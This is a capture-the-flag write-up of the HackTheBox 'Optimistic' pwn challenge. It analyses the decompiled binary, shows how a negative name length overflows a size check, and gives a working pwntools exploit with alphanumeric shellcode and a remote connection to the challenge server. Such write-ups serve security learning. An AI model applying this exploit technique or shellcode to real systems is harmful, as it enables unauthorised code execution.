---

title: HTB [OPTIMISTIC] [PWN]

date: 2022-06-03 02:28:05 +0200

categories: [pwn,htb]

tags: [Intro to Binary Exploitation]

excerpt: Write up for the challenge "Optimistic" from HackTheBox
---

## optimistic

**Challenge description:**

> Are you ready to feel positive?


**Analysis:**

```css
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

- **NX disabled** ,Seems like here also we need to execute the shellcode

![](https://i.imgur.com/tihwCaQ.png)
- If we enter 'y' then we can able to get a stack leak
- And there are few more input prompts, let's see that one by  one

**Decompile main()**

```c
void main(void)

{
  int iVar1;
  ssize_t sVar2;
  uint local_84;
  undefined4 local_80;
  undefined2 local_7c;
  char option;
  undefined local_79;
  undefined auStack120 [8];
  undefined auStack112 [8];
  char local_68 [96];
  
  initialize();
  puts("Welcome to the positive community!");
  puts("We help you embrace optimism.");
  printf("Would you like to enroll yourself? (y/n): ");
  iVar1 = getchar();
  option = (char)iVar1;
  getchar();
  if (option != 'y') {
    puts("Too bad, see you next time :(");
    local_79 = 0x6e;
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Great! Here\'s a small welcome gift: %p\n",&stack0xfffffffffffffff8);
  puts("Please provide your details.");
  printf("Email: ");
  sVar2 = read(0,auStack120,8);
  local_7c = (undefined2)sVar2;
  printf("Age: ");
  sVar2 = read(0,auStack112,8);
  local_80 = (undefined4)sVar2;
  printf("Length of name: ");
  __isoc99_scanf(&DAT_00102104,&local_84);
  if (0x40 < (int)local_84) {
    puts("Woah there! You shouldn\'t be too optimistic.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Name: ");
  sVar2 = read(0,local_68,(ulong)local_84);
  local_84 = 0;
  while( true ) {
    if ((int)sVar2 + -9 <= (int)local_84) {
      puts("Thank you! We\'ll be in touch soon.");
      return;
    }
    iVar1 = isalpha((int)local_68[(int)local_84]);
    if ((iVar1 == 0) && (9 < (int)local_68[(int)local_84] - 0x30U)) break;
    local_84 = local_84 + 1;
  }
  puts("Sorry, that\'s an invalid name.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

- Email & age seems safe
- But there's a length input
- We can enter the size of the length that gonna get input from us after few lines
- But there's a condition check, we can't give more than `0x40` bytes
- If we do that program will exit

![](https://i.imgur.com/q6P0WwA.png)
- Here we need to notice that the length input is an unsigned integer, so there's a integer overflow here
- Challenge's description also denotes that
- If we give `-1` as input then we can able to change that value into a largest possible unsigned integer 
- Now we can able to do buffer overflow

**Exploitation part:**
- Simply generate a pattern and find the offset to RIP
- RIP offset => 104
- But there's a problem

```c
  while( true ) {
    if ((int)sVar2 + -9 <= (int)local_84) {
      puts("Thank you! We\'ll be in touch soon.");
      return;
    }
    iVar1 = isalpha((int)local_68[(int)local_84]);
    if ((iVar1 == 0) && (9 < (int)local_68[(int)local_84] - 0x30U)) break;
    local_84 = local_84 + 1;
  }
```
- There's a check here, our payload need to be larger than `57` Ascii value
- Which means we need only alpha numeric chars
- Let's search for alphanumeric shellcode
- This one looks good [click here](https://www.exploit-db.com/shellcodes/35205)
- So our full exploit be like
- Also remember we need to subtract 96 from the stack leak, our buffer starts before  96 bytes from the leak

**Exploit script:**

```python
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("optimistic",checksec=False)
p = elf.process()
p = remote('188.166.172.138',30591)


# getting leak
p.sendlineafter('y/n): ','y')
p.recvuntil('gift: ')
stack_leak = int(p.recvline().decode(),16)

# filling rest
p.sendlineafter('Email: ','jo')
p.sendlineafter('Age: ','19')
p.sendlineafter('name: ','-1')

# crafting payload
payload = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
payload += b'A'*(104 - len(payload)) # junk
payload += p64(stack_leak-96) # stack base

# sending exploit & getting shell
p.sendlineafter('Name: ',payload)
p.interactive()
```

![](https://i.imgur.com/xoI4oQv.png)
- Cool it worked!
